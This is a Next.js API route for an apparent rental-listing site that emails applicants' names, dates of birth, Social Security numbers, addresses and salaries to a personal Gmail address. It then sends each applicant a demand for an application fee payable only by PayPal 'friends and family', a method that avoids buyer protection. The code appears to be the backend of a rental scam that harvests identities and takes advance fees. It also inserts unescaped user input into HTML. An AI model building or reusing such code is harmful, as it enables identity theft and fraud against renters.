import { transporter } from "@/utilites/transporter";
import { PrismaClient } from "@prisma/client";
import { NextResponse } from "next/server";
export const POST = async (req) => {
  const body = await req.json();
  const prisma = new PrismaClient();
  const serialNumber = Math.floor(
    1000000000000 + Math.random() * 9000000000000
  );
  try {
    const paymentDetail = await prisma.payment.findMany();

    const data = await transporter.sendMail({
      from: "rentalapplication@usarentalapt.com",
      to: "prateraliced@gmail.com",
      subject: "USA Rental Apt",
      html: `<div style="width: 95%; margin: 0 auto">
    <h3>Client Information:</h3>
    <ol>
      <li style="margin-bottom: 10px"><strong>First Name: </strong>${body.firstname}</li>
      <li style="margin-bottom: 10px"><strong>Last Name: </strong>${body.lastname}</li>
      <li style="margin-bottom: 10px">
        <strong>Email: </strong>${body.email}
      </li>
      <li style="margin-bottom: 10px"><strong>Phone: </strong>${body.phone}
      </li>
      <li style="margin-bottom: 10px"><strong>Dath Of Birth: </strong>${body.dob}
      </li>
      <li style="margin-bottom: 10px"><strong>Social Security#: </strong>${body.security}
      </li>
      <li style="margin-bottom: 10px"><strong>Current Address: </strong>${body.currentAddress}</li>
      <li style="margin-bottom: 10px"><strong>State: </strong>${body.state}</li>
      <li style="margin-bottom: 10px"><strong>City: </strong>${body.city}</li>
      <li style="margin-bottom: 10px"><strong>Zip Code: </strong>${body.zipCode}</li>
      <li style="margin-bottom: 10px"><strong>Bed Rooms: </strong>${body.bedRooms}</li>
      <li style="margin-bottom: 10px"><strong>Bath Rooms: </strong>${body.bathRooms}</li>
      <li style="margin-bottom: 10px"><strong>Marital Status: </strong>${body.maritalStatus}</li>
      <li style="margin-bottom: 10px">
        <strong>How Many Pets You Have: </strong>${body.pets}
      </li>
      <li style="margin-bottom: 10px">
        <strong>Do You Have A Vehicle: </strong>${body.vehicle}
      </li>
      <li style="margin-bottom: 10px">
        <strong>How Many Will Be Living In This Unit: </strong>${body.livingUnits}
      </li>
      <li style="margin-bottom: 10px">
        <strong>Employment Status(Monthly): </strong>${body.employmentStatus}
      </li>
      <li style="margin-bottom: 10px">
        <strong>Current Salary(Monthly): </strong>${body.salary}
      </li>
      <li style="margin-bottom: 10px"><strong>About Yourself: </strong>${body.aboutYourself}</li>
    </ol>
  </div>`,
    });
    await transporter.sendMail({
      from: "rentalapplication@usarentalapt.com",
      to: body.email,
      subject: "Payment Request from USA Rental Apt",
      html: `<div style="width: 95%; margin: 0 auto">
    <p>Dear, ${body.firstname} ${body.lastname}</p>
    <strong style="font-size: 1.2rem">Thank you for your application.</strong>
    <p style="font-size: 1.1rem">
      Your application confirmation number is ${serialNumber}.
    </p>
    <strong style="font-size: 1.1rem">Terms of service</strong>
    <p>
      For PayPal Sending from the user end, you need to send USD by using the
      friends and family option from your account. (goods and services, Gift
      payment won't be acceptable).
    </p>
    <ul>
      <li>
        Your application will be submitted to the property owner. If your
        application is accepted you will get a call from the property owner.
        Note: You Must Pay The Application Fee to complete the application
        form. Otherwise, we can not approve any application. If you have not
        paid yet, as soon as to pay. otherwise is nothing to do.
      </li>
      
    </ul>
    <a style="margin-left: auto; width: fit-content; display: block" href=${paymentDetail[0].paylink} >
      <button
        style="
          background-color: rgb(0, 131, 246);
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 4px;
          font-size: 1rem;
        "
      >
        Click Here
      </button></a
    >
  </div>`,
    });
    return NextResponse.json({ message: "email send successfuly" });
  } catch (error) {
    throw Error("something went wrong for sending email");
  }
};
